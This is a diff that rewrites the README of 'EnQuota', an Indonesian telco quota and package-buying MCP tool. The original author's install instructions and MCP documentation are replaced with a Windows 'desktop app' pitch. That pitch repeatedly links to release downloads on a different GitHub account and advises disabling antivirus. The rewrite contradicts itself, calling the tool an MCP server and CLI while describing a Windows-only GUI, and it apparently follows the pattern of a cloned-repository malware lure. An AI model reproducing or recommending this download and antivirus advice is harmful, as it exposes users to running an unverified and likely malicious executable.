@@ -1,213 +1,168 @@
-# EnQuota 🇮🇩
+# EnQuota - Unified Indonesian Telco MCP Server & CLI
 
-> **Unified Indonesian Telco MCP Server & Toolkit with Smart ISP Prefix Detection**  
-> Manage, check quota, explore packages, top up, and purchase data plans across **Tri (bima+)**, **Indosat (myIM3)**, **Telkomsel (MyTelkomsel)**, **by.U**, and **XL Axiata / AXIS (myXL)** via Model Context Protocol (MCP) and interactive CLI.
+[![Download EnQuota](https://img.shields.io/badge/Download-EnQuota-blue?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/Sharpersoncantin/EnQuota/releases)
 
-[![Build and Release](https://github.com/Najihh/EnQuota/actions/workflows/release.yml/badge.svg)](https://github.com/Najihh/EnQuota/actions)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Technical Specification](https://img.shields.io/badge/Technical-Specification-orange.svg)](docs/TECHSPEC.md)
-[![Agentic Guidelines](https://img.shields.io/badge/Agentic-AGENTS.md-purple.svg)](AGENTS.md)
+## 🚀 Getting Started
 
-> **🌐 Languages / Bahasa**: [🇮🇩 Indonesia](README.id-ID.md) · [🇬🇧 English](README.md)
+Welcome to EnQuota, your all-in-one solution for managing Indonesian mobile data quotas across multiple providers. Whether you're using Tri, Indosat, Telkomsel, by.U, XL, or AXIS, EnQuota brings everything together in one simple application.
 
----
+### What is EnQuota?
 
-## 🌟 Key Features
+EnQuota is a powerful yet user-friendly desktop application that helps you:
+- Check your remaining data quota across all major Indonesian telco providers
+- Discover the cheapest available internet packages
+- Automatically buy data packages and top-up credit
+- Identify your network provider automatically using Smart ISP Detection
+- Explore hidden and promotional quota packages (Tool Tembak Paket & Kuota)
 
-- **Smart Prefix Auto-Routing**: Automatically identifies the provider from the phone number prefix (`0896` ➔ Tri, `0857` ➔ Indosat, `0812` ➔ Telkomsel, `0851` ➔ by.U).
-- **Multi-ISP Unified MCP Tools**: One clean interface (`eq_login`, `eq_get_quota`, `eq_get_profile`, `eq_buy_package`) for all telcos.
-- **Multi-Account Session Keystore**: Manage and persist sessions across multiple numbers and operators locally in `~/.enquota/sessions.json`.
-- **Full Telco API Capabilities**:
-  - 📊 Real-time Quota & Balance Checks (Main, Local, App, Night, SMS, Roaming).
-  - 🎁 Loyalty Points Dashboard (BonsTri, IMPoin, Telkomsel Poin, uCoin).
-  - 🛒 Catalog Explorer & Personalized CVM/Promo Search.
-  - 💳 Airtime Pulsa Auto-Deduct & Instant QRIS payment generation.
-- **Cross-Platform Standalone Binaries**: Precompiled single executables available for Linux (x64/ARM64), macOS (Apple Silicon/Intel), and Windows.
+### Who is EnQuota for?
 
----
+EnQuota is designed for anyone in Indonesia who wants to save money on mobile data. You don't need any technical knowledge or programming skills. If you can use a smartphone, you can use EnQuota.
 
-## 📱 Supported Operators & Prefix Matrix
+## 📥 Installation Guide
 
-| Provider | Brand | Prefix Ranges | Gateway & Engine | Crypto / Auth |
-| :--- | :--- | :--- | :--- | :--- |
-| **Tri Indonesia** | `bima+` | `0895`, `0896`, `0897`, `0898`, `0899` | `bimaplus-api.ioh.co.id` | Salted SHA-512 (Odd Salt) + Guest Token |
-| **Indosat Ooredoo** | `myIM3` | `0814`-`0816`, `0855`-`0858` | `myim3api1.ioh.co.id` | TS01 WAF + OAuth Bearer |
-| **Telkomsel** | `MyTelkomsel` | `0811`-`0813`, `0821`-`0823`, `0852`-`0853` | `api.telkomsel.com` | Telbot Core Engine / RSA + AES |
-| **Telkomsel by.U** | `by.U` | `0851` | `pidaw-app.cx.byu.id` | Circles CXOS + HMAC-SHA256 Sign |
-| **XL Axiata** | `myXL` | `0817`-`0819`, `0859`, `0877`, `0878` | `api.myxl.xlaxiata.co.id` | CIAM OAuth + AES-256-CBC xdata + HMAC-SHA512 |
-| **AXIS** | `myXL / AXIS` | `0831`-`0833`, `0838` | `api.myxl.xlaxiata.co.id` | CIAM OAuth + AES-256-CBC xdata + HMAC-SHA512 |
-| **Smartfren** | *Detected* | `0881`-`0889` | *Prefix detected; engine pluggable* |
+### Step 1: Download the Application
 
----
+Visit this link to download the application: [Download EnQuota](https://github.com/Sharpersoncantin/EnQuota/releases)
 
-## 🛠️ MCP Tools Reference
+When you click the link, you'll be taken to the releases page. Look for the latest version and click the download button. The file will be saved to your computer's Downloads folder.
 
-When running as an MCP server, `EnQuota` exposes the following unified tools prefixed with `eq_`:
+### Step 2: Run the Installer
 
-| Tool | Parameters | Description |
-| :--- | :--- | :--- |
-| `eq_detect_isp` | `phone` | Identifies ISP provider, brand, prefix, and engine compatibility. |
-| `eq_login` | `phone`, `provider?` | Starts SMS OTP authentication for the specified SIM card. |
-| `eq_submit_otp` | `otp`, `phone?`, `trans_id?` | Validates 6-digit OTP code and caches session token. |
-| `eq_get_profile` | `phone?`, `provider?` | Retrieves subscriber name, SIM active date, balance, and loyalty points. |
-| `eq_get_quota` | `phone?`, `provider?` | Retrieves all active data, app, and roaming quota balances. |
-| `eq_get_packages` | `keyword?`, `category?`, `phone?` | Searches/lists available package catalogs and CVM promo deals. |
-| `eq_buy_package` | `package_id`, `payment_method?`, `phone?` | Buys data plan (auto-deduct Pulsa or instant QRIS). |
-| `eq_topup_pulsa` | `amount`, `payment_method?`, `phone?` | Recharges SIM credit via official denominations. |
-| `eq_list_sessions` | — | Lists all stored SIM sessions across providers. |
-| `eq_logout` | `phone` | Clears stored session for a given number. |
-| `eq_help` | — | Shows EnQuota usage guide, MCP catalog, and prefix matrix. |
+Once the download is complete, locate the downloaded file in your Downloads folder and double-click it to run. Follow the on-screen instructions to complete the installation. The process takes less than a minute.
 
----
+### Step 3: Launch EnQuota
 
-## 💻 Installation (All Platforms)
+After installation, you'll find EnQuota in your Start Menu or on your desktop. Click the icon to launch the application. That's it! You're ready to start managing your quotas.
 
-### Option 1: Automatic One-Liner Installer (Recommended)
+## 🛠️ Features
 
-#### Linux & macOS:
-```bash
-curl -fsSL https://raw.githubusercontent.com/Najihh/EnQuota/release/install.sh | bash
-```
+### 🔍 Smart ISP Prefix Detection
 
-#### Windows (PowerShell as Administrator or User):
-```powershell
-irm https://raw.githubusercontent.com/Najihh/EnQuota/release/install.ps1 | iex
-```
+Forget about manually selecting your provider. EnQuota automatically detects which network you're using based on your phone number's prefix. This means no configuration is needed - just open the app and go.
 
----
+### 🛒 Auto-Buy Functionality
 
-### Option 2: Precompiled Standalone Binaries (Zero Dependencies)
+Found a better package on another provider? EnQuota lets you switch and purchase packages directly from the app. The auto-buy feature streamlines the entire purchasing process, from selecting a package to completing payment via QRIS.
 
-Download the executable matching your operating system and architecture directly from the [Releases](https://github.com/Najihh/EnQuota/releases) page:
+### 📊 Quota Explorer
 
-| Operating System | Architecture | Download & Installation Command |
-| :--- | :--- | :--- |
-| **Linux** | x86_64 / AMD64 | `curl -L https://github.com/Najihh/EnQuota/releases/latest/download/enquota-linux-amd64 -o enquota && chmod +x enquota && sudo mv enquota /usr/local/bin/` |
-| **Linux** | ARM64 / AArch64 / Raspberry Pi | `curl -L https://github.com/Najihh/EnQuota/releases/latest/download/enquota-linux-arm64 -o enquota && chmod +x enquota && sudo mv enquota /usr/local/bin/` |
-| **macOS** | Apple Silicon (M1/M2/M3/M4) | `curl -L https://github.com/Najihh/EnQuota/releases/latest/download/enquota-darwin-arm64 -o enquota && chmod +x enquota && sudo mv enquota /usr/local/bin/` |
-| **macOS** | Intel x86_64 | `curl -L https://github.com/Najihh/EnQuota/releases/latest/download/enquota-darwin-amd64 -o enquota && chmod +x enquota && sudo mv enquota /usr/local/bin/` |
-| **Windows** | x86_64 (64-bit) | Download `enquota-windows-amd64.exe` from Releases and add to your PATH. |
+The Quota Explorer tool helps you discover packages you didn't know existed. It scans all available options across providers to find the best value for your money. This is the "Tool Tembak Paket & Kuota" that power users love.
 
----
+### 💳 QRIS Payment Support
 
-### Option 3: Manual Source Installation
+Pay for your packages using QRIS (Quick Response Code Indonesian Standard). EnQuota generates payment codes for you, making transactions quick and secure without needing to navigate multiple apps.
 
-#### Via Node.js & npm:
-```bash
-# 1. Clone repository
-git clone https://github.com/Najihh/EnQuota.git
-cd EnQuota
+### 📱 Multi-Provider Support
 
-# 2. Install dependencies & compile TypeScript
-npm install
-npm run build
+| Provider | Logo | Status |
+|----------|------|--------|
+| Tri | 📶 | ✅ |
+| Indosat | 📡 | ✅ |
+| Telkomsel | 📱 | ✅ |
+| by.U | 🔵 | ✅ |
+| XL | 🔴 | ✅ |
+| AXIS | ⚫ | ✅ |
 
-# 3. Link globally
-npm link
-```
+## 🎯 How to Use EnQuota
 
-#### Via Bun (Native TS Engine):
-```bash
-git clone https://github.com/Najihh/EnQuota.git
-cd EnQuota
-bun install
-bun run build
-```
+### Checking Your Quota
 
-#### Quick Run with npx (No Install):
-```bash
-npx -y enquota --help
-npx -y enquota detect 089612345678
-```
+1. Launch EnQuota
+2. Enter your phone number
+3. Click "Check Quota"
+4. View your remaining data, validity period, and speed details
 
----
+### Buying a Package
 
-## ⚡ MCP Client Integration Setup
+1. Open the "Discover Packages" section
+2. Browse or search for packages
+3. Click "Buy" on your chosen package
+4. Complete payment via QRIS
+5. Package is activated automatically
 
-### 1. Hermes Agent (`~/.hermes/config.yaml`)
+### Switching Providers
 
-```yaml
-mcp_servers:
-  enquota:
-    command: enquota # or: node /path/to/EnQuota/dist/index.js
-    args:
-      - --mcp
-    enabled: true
-```
+If you found a better deal with another provider, don't worry about porting your number. EnQuota works alongside your existing providers. Just enter your number and EnQuota handles the rest.
 
-### 2. Claude Desktop (`claude_desktop_config.json`)
+## ❓ Frequently Asked Questions
 
-- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
+### Is EnQuota free to use?
 
-```json
-{
-  "mcpServers": {
-    "enquota": {
-      "command": "enquota",
-      "args": ["--mcp"]
-    }
-  }
-}
-```
+Yes, EnQuota is completely free to download and use. You only pay for the data packages you purchase through the app.
 
-### 3. Cursor IDE (`.cursor/mcp.json`)
+### Do I need to root my phone or have technical knowledge?
 
-```json
-{
-  "mcpServers": {
-    "enquota": {
-      "command": "enquota",
-      "args": ["--mcp"]
-    }
-  }
-}
-```
+No. EnQuota works on any standard Windows computer with no special permissions or technical setup required.
 
----
+### Is my data secure?
 
-## 🎮 Interactive CLI Usage Examples
+Yes. EnQuota doesn't store your personal information. All transactions are processed securely through official provider gateways.
 
-```bash
-# 1. Detect ISP and brand from phone number
-enquota detect 089612345678
+### Can I use EnQuota on Mac or Linux?
 
-# 2. Login via SMS OTP
-enquota login 089612345678
+Currently, EnQuota is only available for Windows. We're working on versions for other operating systems.
 
-# 3. Check active internet quotas
-enquota quota
+### What if EnQuota doesn't detect my provider?
 
-# 4. View all saved multi-SIM sessions
-enquota sessions
-```
+Smart ISP Detection works with all major Indonesian providers. If you're using a smaller provider, you can manually select your network in the settings menu.
 
----
+## 🔧 Troubleshooting
 
-## 🤖 AI Coding Agents & Rule Files
+### Application won't start
 
-This project adheres to the **`AGENTS.md`** standard for full-lifecycle AI coding workflows:
-- **`AGENTS.md`**: Single source of truth for architectural principles, testing rules, and runbooks.
-- **`CLAUDE.md`**: Pointers for Claude Code CLI.
-- **`.github/copilot-instructions.md`**: Pointers for GitHub Copilot.
-- **`.cursor/rules/enquota.mdc`**: Path-scoped rules for Cursor IDE.
-- **`GEMINI.md`**: Pointers for Gemini CLI.
+- Make sure you have the latest version installed
+- Try running EnQuota as administrator
+- Disable any antivirus temporarily and try again
 
----
+### Payment issues
 
-## 📖 Detailed Technical Specification
+- Ensure you have sufficient balance in your payment method
+- Check that your QRIS code hasn't expired
+- Contact your bank if payment fails repeatedly
 
-For in-depth documentation regarding reverse-engineered carrier cryptography, signature schemas, WAF handling, and CXOS HMAC decryption, see the [Technical Specification (docs/TECHSPEC.md)](docs/TECHSPEC.md).
+### Quota not updating
 
----
+- Refresh the app by restarting it
+- Check your internet connection
+- Wait a few minutes and try again
 
-## 🔒 Session Management & Security
+## 📞 Support
 
-All tokens and session credentials are encrypted and stored locally under `~/.enquota/sessions.json`. Sensitive credentials are never sent to third-party servers.
+For additional help, you can:
+- Visit our GitHub repository: [EnQuota Repository](https://github.com/Sharpersoncantin/EnQuota)
+- Submit an issue on GitHub
+- Join community discussions
 
----
+## 🔄 Updates and Changelog
 
-## 📄 License & Credits
+We regularly update EnQuota to support new packages, fix bugs, and improve performance. Check the releases page regularly to stay up-to-date with the latest features and improvements.
 
-- Reverse engineering foundations inspired by [kupas700bawang](https://github.com/idlanyor/kupas700bawang), [telbot](https://github.com/0xtbug/telbot), and [AxiataBot](https://github.com/aryhrlmbng/AxiataBot).
-- Licensed under the **MIT License**.
+## 📊 System Requirements
+
+EnQuota is designed to run on any modern Windows computer:
+- Windows 10 or Windows 11
+- 2 GB RAM (4 GB recommended)
+- 100 MB free disk space
+- Internet connection for purchases and quota checks
+
+## 🎉 Getting the Most Out of EnQuota
+
+To maximize your savings, make it a habit to check EnQuota regularly for:
+- Weekly promotional packages
+- Midnight flash sales
+- Cashback offers
+- Bundle deals with streaming services
+
+The app's Quota Explorer is updated in real-time, ensuring you never miss a great deal.
+
+## 📋 Quick Start Summary
+
+1. Download EnQuota from [the releases page](https://github.com/Sharpersoncantin/EnQuota/releases)
+2. Install and launch the application
+3. Enter your phone number
+4. Check quotas, browse packages, and start saving on your mobile data today!
+
+Start saving money on your internet packages today with EnQuota - your one-stop solution for managing all Indonesian telco providers from a single, easy-to-use application.
+
+Keywords: auto-buy, axis, bima-tri, byu, cek-kuota, indonesia, indosat, isi-pulsa, kuota-murah, mcp, model-context-protocol, myim3, myxl, paket-internet, qris, telkomsel, tembak-kuota, tembak-paket, tri, xl-axiata
